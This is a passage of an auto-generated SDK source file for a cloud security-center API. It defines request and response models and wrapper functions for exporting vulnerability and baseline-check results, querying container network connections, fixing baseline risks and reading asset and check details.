  uuids?: string(name='Uuids', description='The UUID of the server on which the vulnerabilities are detected. Separate multiple UUIDs with commas (,).', example='1587bedb-fdb4-48c4-9330-****'),
  vpcInstanceIds?: string(name='VpcInstanceIds', description='The ID of the virtual private cloud (VPC) in which the vulnerabilities are detected. Separate multiple IDs with commas (,).

>  You can call the [DescribeVpcList](~~DescribeVpcList~~) operation to query the IDs of VPCs.', example='ins-133****,ins-5414****'),
}

model ExportVulResponseBody = {
  fileName?: string(name='FileName', description='The name of the exported file.', example='app_20211101'),
  id?: long(name='Id', description='The ID of the exported file.', example='81634'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='E1FAB2B8-DF4D-55DF-BC3D-5C3CA6FD5B13'),
}

model ExportVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportVulResponseBody(name='body'),
}

/**
  * You can call the ExportVul operation to export the following types of vulnerabilities: Linux software vulnerabilities, Windows system vulnerabilities, Web-CMS vulnerabilities, application vulnerabilities, and urgent vulnerabilities.
  * You can use this operation together with the DescribeVulExportInfo operation. After you call the ExportVul operation to create a vulnerability export task, you can call the DescribeVulExportInfo operation to query the progress of the task by specifying the ID of the task.
  * ### Limits
  * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
  * @param request ExportVulRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ExportVulResponse
 */
async function exportVulWithOptions(request: ExportVulRequest, runtime: Util.RuntimeOptions): ExportVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * You can call the ExportVul operation to export the following types of vulnerabilities: Linux software vulnerabilities, Windows system vulnerabilities, Web-CMS vulnerabilities, application vulnerabilities, and urgent vulnerabilities.
  * You can use this operation together with the DescribeVulExportInfo operation. After you call the ExportVul operation to create a vulnerability export task, you can call the DescribeVulExportInfo operation to query the progress of the task by specifying the ID of the task.
  * ### Limits
  * You can call this operation up to 10 times per second per account. If the number of the calls per second exceeds the limit, throttling is triggered. As a result, your business may be affected. We recommend that you take note of the limit when you call this operation.
  *
  * @param request ExportVulRequest
  * @return ExportVulResponse
 */
async function exportVul(request: ExportVulRequest): ExportVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportVulWithOptions(request, runtime);
}

model ExportWarningRequest {
  dealed?: string(name='Dealed', description='Specifies whether the baseline risks are handled. Valid values:

*   **Y**: yes
*   **N**: no', example='N'),
  exportType?: string(name='ExportType', description='The type of the export task. Set the value to **hc_check_warning**, which indicates tasks to export baseline check results.', example='hc_check_warning'),
  isCleartextPwd?: int32(name='IsCleartextPwd', description='The export method of the results for the weak password baseline check. Valid values:

*   **0**: exports the check results after it is masked.
*   **1**: exports the check results in plaintext.', example='0'),
  isSummaryExport?: int32(name='IsSummaryExport', description='Specifies whether the baseline check results are aggregated and exported. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskIds?: string(name='RiskIds', description='The ID of the risk item in the baseline check results. Separate multiple IDs with commas (,).', example='123,124'),
  riskLevels?: string(name='RiskLevels', description='The severity of the baseline check item. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='high,medium'),
  riskName?: string(name='RiskName', description='The name of the baseline.', example='Alibaba Cloud Standard - Windows 2016/2019  Security Baseline'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
  statusList?: string(name='StatusList', description='The status of the check item in the baseline check results. Separate multiple statuses with commas (,). Valid values:

*   **3**: passed
*   **1**: failed', example='1,3'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='12'),
  subTypeNames?: string(name='SubTypeNames', description='The subtypes of the baselines based on which baseline checks are performed. Separate multiple subtypes with commas (,).

>  You must set the value of this parameter to the value of the **TypeName** parameter that is contained in the **SubTypes** parameter. You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to obtain the value of the TypeName parameter.', example='hc_middleware_ack_master'),
  typeName?: string(name='TypeName', description='The type of the baseline based on which baseline checks are performed.

>  You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container'),
  typeNames?: string(name='TypeNames', description='The types of the baselines based on which baseline checks are performed. Separate multiple types with commas (,).

>  You must set the value of this parameter to the value of the **TypeName** parameter that is returned by calling the [DescribeRiskType](~~DescribeRiskType~~) operation. If both the **TypeName** and **TypeNames** parameters are specified, only the **TypeName** parameter takes effect.', example='hc_container,cis'),
  uuids?: string(name='Uuids', description='The UUID of the server whose baseline check results you want to export. Separate multiple UUIDs with commas (,).', example='inet-7c676676-06fa-442e-90fb-b802e****,inet-7c676676-06fa-442e-90fb-b****'),
}

model ExportWarningResponseBody = {
  fileName?: string(name='FileName', description='The name of the file that contains exported baseline check results.', example='health_check_export_20220407'),
  id?: long(name='Id', description='The ID of the task to export baseline check results.', example='439316'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A7FC828B-C242-1005-9736-C7CC5DC09FF0'),
}

model ExportWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportWarningResponseBody(name='body'),
}

async function exportWarningWithOptions(request: ExportWarningRequest, runtime: Util.RuntimeOptions): ExportWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.isCleartextPwd)) {
    query['IsCleartextPwd'] = request.isCleartextPwd;
  }
  if (!Util.isUnset(request.isSummaryExport)) {
    query['IsSummaryExport'] = request.isSummaryExport;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.subTypeNames)) {
    query['SubTypeNames'] = request.subTypeNames;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.typeNames)) {
    query['TypeNames'] = request.typeNames;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportWarning(request: ExportWarningRequest): ExportWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportWarningWithOptions(request, runtime);
}

model FindContainerNetworkConnectRequest {
  criteriaType?: string(name='CriteriaType', example='EDGE'),
  currentPage?: long(name='CurrentPage', example='1'),
  dstNode?: {
    appName?: string(name='AppName', example='nginx-ingress-controller'),
    clusterId?: string(name='ClusterId', example='f5x833820xx'),
    namespace?: string(name='Namespace', example='default'),
    nodeIds?: [ string ](name='NodeIds'),
    nodeType?: string(name='NodeType', example='app'),
    podName?: string(name='PodName', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='DstNode'),
  endTime?: long(name='EndTime', example='1649260799999'),
  pageSize?: long(name='PageSize', example='20'),
  srcNode?: {
    appName?: string(name='AppName', example='arms-prometheus-ack-arms-prometheus'),
    clusterId?: string(name='ClusterId', example='c56xxx1775dea0'),
    namespace?: string(name='Namespace', example='default'),
    nodeIds?: [ string ](name='NodeIds'),
    nodeType?: string(name='NodeType', example='app'),
    podName?: string(name='PodName', example='abc-deployment-yacs-31144-39265-1384966-7f8c8cd578-h6mhb'),
  }(name='SrcNode'),
  startTime?: long(name='StartTime', example='1666886400000'),
}

model FindContainerNetworkConnectShrinkRequest {
  criteriaType?: string(name='CriteriaType', example='EDGE'),
  currentPage?: long(name='CurrentPage', example='1'),
  dstNodeShrink?: string(name='DstNode'),
  endTime?: long(name='EndTime', example='1649260799999'),
  pageSize?: long(name='PageSize', example='20'),
  srcNodeShrink?: string(name='SrcNode'),
  startTime?: long(name='StartTime', example='1666886400000'),
}

model FindContainerNetworkConnectResponseBody = {
  connects?: [ 
    {
      dstContainer?: {
        containerId?: string(name='ContainerId', example='48a6dxxx9d5a5866'),
      }(name='DstContainer'),
      dstIp?: string(name='DstIp', example='172.20.62.176'),
      dstPort?: string(name='DstPort', example='443'),
      firstTime?: long(name='FirstTime', example='2022-11-11 20:54:32'),
      id?: long(name='Id', example='1458'),
      lastTime?: long(name='LastTime', example='2022-11-24 10:26:00'),
      srcContainer?: {
        containerId?: string(name='ContainerId', example='48a6xxx5709d5a5866'),
      }(name='SrcContainer'),
      srcIp?: string(name='SrcIp', example='35.233.62.116'),
      srcPort?: string(name='SrcPort', example='10240'),
    }
  ](name='Connects'),
  pageInfo?: {
    count?: long(name='Count', example='10'),
    currentPage?: long(name='CurrentPage', example='1'),
    pageSize?: long(name='PageSize', example='20'),
    totalCount?: long(name='TotalCount', example='12'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='8686CE6E-9BFA-5436-A9D9-77B984AEE7F8'),
}

model FindContainerNetworkConnectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FindContainerNetworkConnectResponseBody(name='body'),
}

async function findContainerNetworkConnectWithOptions(tmpReq: FindContainerNetworkConnectRequest, runtime: Util.RuntimeOptions): FindContainerNetworkConnectResponse {
  Util.validateModel(tmpReq);
  var request = new FindContainerNetworkConnectShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstNode)) {
    request.dstNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstNode, 'DstNode', 'json');
  }
  if (!Util.isUnset(tmpReq.srcNode)) {
    request.srcNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcNode, 'SrcNode', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dstNodeShrink)) {
    query['DstNode'] = request.dstNodeShrink;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.srcNodeShrink)) {
    query['SrcNode'] = request.srcNodeShrink;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FindContainerNetworkConnect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function findContainerNetworkConnect(request: FindContainerNetworkConnectRequest): FindContainerNetworkConnectResponse {
  var runtime = new Util.RuntimeOptions{};
  return findContainerNetworkConnectWithOptions(request, runtime);
}

model FixCheckWarningsRequest {
  checkParams?: string(name='CheckParams', description='The parameters for the baseline risk item that you want to fix.

*   **checkId**: the ID of the check item that corresponds to the baseline risk item.

*   **rules**: an array that consists of the rules applied to fixes.

    *   **value**: specifies whether a fix method is selected. Valid values: **0** and **1**. The value 0 indicates that no fix method is selected and the value 1 indicates that a fix method is selected.
    *   **ruleId**: the ID of the fix method.
    *   **paramList**: an array that consists of the details about the fix method.\\
        • **paramName**: the name of the fix method.\\
        • **value**: the value of the fix method.', example='[{"checkId":8,"rules":[{"ruleId":"rule.ssh_Idle.interval","value":1,"paramList":[{"paramName":"range_val","value":"600"},{"paramName":"range_val","value":"600"}]},{"ruleId":"rule.ssh_Idle.count","value":1,"paramList":[{"paramName":"range_val","value":"3"}]}]}]'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskId?: long(name='RiskId', description='The ID of the baseline risk item.

>  To query specified baseline risk items and the check items of a specified server, you must provide the IDs of the baseline risk items. You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs.', example='10354'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='165.225.XX.XX'),
  uuids?: string(name='Uuids', description='The UUID of the asset for which you want to fix the baseline risk item. You can call the [DescribeWarningMachines](~~DescribeWarningMachines~~) operation to query the UUIDs of assets.', example='75a417dda5f25edb5bed8f208a9a****,c7e10fd794262a1510d5648f9e5d****'),
}

model FixCheckWarningsResponseBody = {
  batchId?: long(name='BatchId', description='The ID of the baseline risk item that has been fixed by using the Batch Repair feature.', example='52370'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='76C1D7FD-DB1E-45EA-B804-3FBD9A1DD9C0'),
}

model FixCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FixCheckWarningsResponseBody(name='body'),
}

async function fixCheckWarningsWithOptions(request: FixCheckWarningsRequest, runtime: Util.RuntimeOptions): FixCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkParams)) {
    query['CheckParams'] = request.checkParams;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FixCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function fixCheckWarnings(request: FixCheckWarningsRequest): FixCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return fixCheckWarningsWithOptions(request, runtime);
}

model GenerateOnceTaskRequest {
  param?: string(name='Param', example='{"mode":1,"problemType":"offline","uuids":"inet-795dcad1-360f-49d2-b01e-b7da7f1c****"}'),
  source?: string(name='Source', example='Manual'),
  taskName?: string(name='TaskName', example='CLIENT_PROBLEM_CHECK'),
  taskType?: string(name='TaskType', example='CLIENT_PROBLEM_CHECK'),
}

model GenerateOnceTaskResponseBody = {
  canCreate?: boolean(name='CanCreate', example='true'),
  collectTime?: long(name='CollectTime', example='1670307567000'),
  finishCount?: int32(name='FinishCount', example='61'),
  lastTask?: string(name='LastTask', example='38730bb078f4a1461d4ed283994c****'),
  requestId?: string(name='RequestId', example='8BB6B8FA-39E8-5654-A309-8EED13B1****'),
  taskId?: string(name='TaskId', example='38730bb078f4a1461d4ed283994c****'),
  totalCount?: int32(name='TotalCount', example='100'),
}

model GenerateOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GenerateOnceTaskResponseBody(name='body'),
}

async function generateOnceTaskWithOptions(request: GenerateOnceTaskRequest, runtime: Util.RuntimeOptions): GenerateOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GenerateOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function generateOnceTask(request: GenerateOnceTaskRequest): GenerateOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return generateOnceTaskWithOptions(request, runtime);
}

model GetAlarmMachineCountRequest {
  from?: string(name='From', example='sas'),
}

model GetAlarmMachineCountResponseBody = {
  data?: {
    machineCount?: int32(name='MachineCount', example='1'),
  }(name='Data'),
  requestId?: string(name='RequestId', example='6D3A2E7D-1238-5DD4-B3C3-BF06FCAD****'),
}

model GetAlarmMachineCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAlarmMachineCountResponseBody(name='body'),
}

async function getAlarmMachineCountWithOptions(request: GetAlarmMachineCountRequest, runtime: Util.RuntimeOptions): GetAlarmMachineCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAlarmMachineCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAlarmMachineCount(request: GetAlarmMachineCountRequest): GetAlarmMachineCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAlarmMachineCountWithOptions(request, runtime);
}

model GetAssetsPropertyDetailRequest {
  biz?: string(name='Biz'),
  currentPage?: int32(name='CurrentPage'),
  itemName?: string(name='ItemName'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  searchCriteriaList?: [ 
    {
      name?: string(name='Name'),
      value?: string(name='Value'),
    }
  ](name='SearchCriteriaList'),
  uuid?: string(name='Uuid'),
}

model GetAssetsPropertyDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      containerName?: string(name='ContainerName'),
      createTimestamp?: long(name='CreateTimestamp'),
      domain?: string(name='Domain'),
      filepath?: string(name='Filepath'),
      imageName?: string(name='ImageName'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      listenProtocol?: string(name='ListenProtocol'),
      moduleName?: string(name='ModuleName'),
      path?: string(name='Path'),
      pathMode?: string(name='PathMode'),
      pid?: string(name='Pid'),
      port?: string(name='Port'),
      processStarted?: long(name='ProcessStarted'),
      regionId?: string(name='RegionId'),
      serverType?: string(name='ServerType'),
      size?: int32(name='Size'),
      usedByCount?: int32(name='UsedByCount'),
      user?: string(name='User'),
      uuid?: string(name='Uuid'),
      webPath?: string(name='WebPath'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model GetAssetsPropertyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyDetailResponseBody(name='body'),
}

async function getAssetsPropertyDetailWithOptions(request: GetAssetsPropertyDetailRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemName)) {
    query['ItemName'] = request.itemName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchCriteriaList)) {
    query['SearchCriteriaList'] = request.searchCriteriaList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAssetsPropertyDetail(request: GetAssetsPropertyDetailRequest): GetAssetsPropertyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyDetailWithOptions(request, runtime);
}

model GetAssetsPropertyItemRequest {
  biz?: string(name='Biz'),
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  searchInfo?: string(name='SearchInfo'),
  searchItem?: string(name='SearchItem'),
}

model GetAssetsPropertyItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      domain?: string(name='Domain'),
      moduleName?: string(name='ModuleName'),
      path?: string(name='Path'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model GetAssetsPropertyItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyItemResponseBody(name='body'),
}

async function getAssetsPropertyItemWithOptions(request: GetAssetsPropertyItemRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAssetsPropertyItem(request: GetAssetsPropertyItemRequest): GetAssetsPropertyItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyItemWithOptions(request, runtime);
}

model GetBackupStorageCountResponseBody = {
  backupStorageCount?: {
    buyStorageByte?: long(name='BuyStorageByte'),
    ecsUsageStorageByte?: long(name='EcsUsageStorageByte'),
    overflow?: int32(name='Overflow'),
    uniUsageStorageByte?: long(name='UniUsageStorageByte'),
    usageStorageByte?: long(name='UsageStorageByte'),
  }(name='BackupStorageCount'),
  requestId?: string(name='RequestId'),
}

model GetBackupStorageCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetBackupStorageCountResponseBody(name='body'),
}

async function getBackupStorageCountWithOptions(runtime: Util.RuntimeOptions): GetBackupStorageCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetBackupStorageCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getBackupStorageCount(): GetBackupStorageCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getBackupStorageCountWithOptions(runtime);
}

model GetCheckConfigRequest {
  lang?: string(name='Lang'),
}

model GetCheckConfigResponseBody = {
  cycleDays?: [ int32 ](name='CycleDays'),
  endTime?: int32(name='EndTime'),
  requestId?: string(name='RequestId'),
  standards?: [ 
    {
      id?: long(name='Id'),
      showName?: string(name='ShowName'),
      status?: string(name='Status'),
      type?: string(name='Type'),
    }
  ](name='Standards'),
  startTime?: int32(name='StartTime'),
}

model GetCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckConfigResponseBody(name='body'),
}

async function getCheckConfigWithOptions(request: GetCheckConfigRequest, runtime: Util.RuntimeOptions): GetCheckConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckConfig(request: GetCheckConfigRequest): GetCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckConfigWithOptions(request, runtime);
}

model GetCheckDetailRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.', example='2'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
}

model GetCheckDetailResponseBody = {
  assistInfo?: {
    link?: string(name='Link', description='The link to the help information about the risk item when the Type parameter is set to link.', example='https://www.alibabacloud.com/help/en/resource-access-management/latest/faq-about-ram-users'),
    type?: string(name='Type', description='The type of the help information about the risk item. Valid values:

*   **text**
*   **link**', example='text'),
    value?: string(name='Value', description='The content in the help information about the risk item when the Type parameter is set to text.', example='Configure an IP address whitelist'),
  }(name='AssistInfo', description='The help information about the check item.'),
  description?: {
    link?: string(name='Link', description='The link to the description of the check item.', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', description='The type of the description of the check item. The value is fixed as text.', example='text'),
    value?: string(name='Value', description='The content in the description of the check item.', example='The MSE instance does not enable authentication by default. If public network access is enabled at the same time, the data in the configuration center may be dragged and there is a security risk.'),
  }(name='Description', description='The description of the check item.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='15A6ED6A-DBFE-5255-A248-289907809BEC'),
  solution?: {
    link?: string(name='Link', description='The link to the solution to handle the risk item when the Type parameter is set to link.', example='https://www.alibabacloud.com/help/en/object-storage-service/latest/tutorial-implement-data-sharing-across-departments-based-on-bucket-policies'),
    type?: string(name='Type', description='The type of the solution to handle to the risk item. Valid values:

*   **text**
*   **link**', example='text'),
    value?: string(name='Value', description='The content of the solution to handle the risk item when the Type parameter is set to text.', example='Enter the MSE product console - registration and configuration center - instance list, click the corresponding instance name to enter the instance details, find the public network whitelist setting option in the basic information, and configure the whitelist according to business needs. It is forbidden to configure 0.0.0.0 or the whitelist as null.'),
  }(name='Solution', description='The solution to handle the risk item.'),
}

model GetCheckDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckDetailResponseBody(name='body'),
}

async function getCheckDetailWithOptions(request: GetCheckDetailRequest, runtime: Util.RuntimeOptions): GetCheckDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
